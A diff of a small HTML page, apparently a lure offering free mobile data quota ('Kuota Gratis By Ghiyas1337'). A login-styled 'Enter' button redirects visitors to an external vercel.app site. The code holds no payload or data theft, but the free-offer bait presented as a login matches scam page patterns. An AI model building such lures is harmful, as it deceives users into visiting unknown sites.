@@ -1,16 +1,56 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Backlink</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Kuota Gratis By Ghiyas1337</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+    <style type="text/css">
+        body {
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000; /* Set a background color */
+            margin: 0;
+            color: #fff;
+        }
+        .login-container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #2a2a2a;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #00ff00;
+            color: black;
+            border: none;
+            border-radius: 7px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: rgb(111, 75, 164);
+        }
+    </style>
 </head>
 <body>
-    <h1></h1>
-    <p>maaf, silahkan pencet bawah ini untuk mendapatkan kuota gratis</p>
-    
-    <p>Pencet ini untuk mendapatkan kuota gratis <a href="https://www.example.com" target="_blank">Example.com</a>.</p>
-    
-    <p>Terima kasih telah mengunjungi halaman ini!</p>
+<div class="login-container">
+    <button class="login-button" id="login-button"><h4>Enter</h4></button>
+</div>
+<script type="text/javascript">
+    const loginButton = document.getElementById("login-button");
+
+    loginButton.addEventListener("click", function(event) {
+        event.preventDefault();
+        // Redirect to a different link
+        window.location.href = "https://kuota-gratis-by-ghiyas.vercel.app/"; // Replace with your desired URL
+    });
+</script>
 </body>
 </html>
